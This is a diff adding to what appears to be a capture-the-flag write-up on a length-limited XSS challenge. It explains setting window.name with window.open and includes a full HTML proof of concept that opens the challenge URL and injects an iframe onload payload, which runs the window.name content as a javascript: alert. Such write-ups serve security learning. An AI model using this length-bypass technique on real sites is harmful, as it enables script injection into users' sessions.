@@ -118,8 +118,26 @@
 
 <iframe src=javascript:alert()>
 ```
+> We can control Window name using window.open function : window.open(url,name)
 
 ### So, let's exploit this in our side to get alert : )
+
+```javascript
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <Script>window.open('http://185.69.167.144:6060/xss3/?name=\\74iframe/onload=src=top.name\\76','javascript:alert(\'THIS IS MORE THAN 38 CHARS FOR SUREEEEEEEEEEEEEEEEEE MY BRUUUUUUUUUUUUH \')')</Script>
+<p id="a"></p>
+<script>a.innerHTML="b";</script>
+</body>
+</html>
+```
+
 
 ![image](https://github.com/abdoghazy2015/CTF-Write-Ups/assets/64314534/fefb4571-539f-4c1b-9d67-fb0158bba780)
 
